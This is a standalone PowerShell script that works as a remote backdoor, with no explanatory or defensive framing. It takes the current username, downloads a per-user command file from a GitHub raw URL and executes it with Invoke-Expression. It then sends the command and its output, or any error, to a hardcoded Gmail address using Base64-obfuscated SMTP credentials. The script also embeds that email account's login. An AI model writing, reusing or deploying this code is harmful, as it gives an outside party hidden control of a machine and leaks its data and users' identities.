
function Send-ToEmail([string]$email,[string]$body,[string]$subj=$env:username){
    $UsernameEnc = "eABhAGsAZQByAC4AaQBzAGkAMAAwADcAQABnAG0AYQBpAGwALgBjAG8AbQA=";
    $PasswordEnc = "cAB2AGsAcgBmAHIAeABpAHAAeABqAHIAdgBlAHcAZgA=";
    $Username = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($UsernameEnc))
    $Password = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($PasswordEnc))
    $message = new-object Net.Mail.MailMessage;
    $message.From = $Username;
    $message.To.Add($email);
    $message.Subject = $subj;
    $message.Body = $body;
    $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", "587");
    $smtp.EnableSSL = $true;
    $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
    $smtp.send($message);
 }
 
 function Get-UrlStatusCode([string] $Url)
{
    try
    {
        (Invoke-WebRequest -Uri $Url -UseBasicParsing -DisableKeepAlive).StatusCode
    }
    catch [Net.WebException]
    {
        [int]$_.Exception.Response.StatusCode
    }
}
$name = $env:username
$url = "https://raw.githubusercontent.com/4V4loon/tools/master/ctwo/$name"
$statusCode = Get-UrlStatusCode $url
if ($statusCode -eq 200){
    $contentLocal = "False"
    $contentWeb = Invoke-WebRequest -Uri $url -UseBasicParsing | select -ExpandProperty Content
    $diff = Compare-Object -ReferenceObject $($contentLocal) -DifferenceObject $($contentWeb)
    if($diff) {
        try {
            $runn = & Invoke-Expression $contentWeb 2>&1 | Out-String
            if($?){ $res=$contentWeb + "`n" + $runn; $don = "Done - "+$name; Send-ToEmail -email "xelil.isi007@gmail.com" -body $res -subj $don }
        } catch {
            $err = $_ | Out-String
            $suberr = "Error - "+$name
            Send-ToEmail -email "xelil.isi007@gmail.com" -body $err -subj $suberr
        }
    }
} else {
    Send-ToEmail -email "xelil.isi007@gmail.com" -body $name -subj "UserNotFound"
}

# Invoke-Expression $contentWeb -ErrorAction Stop
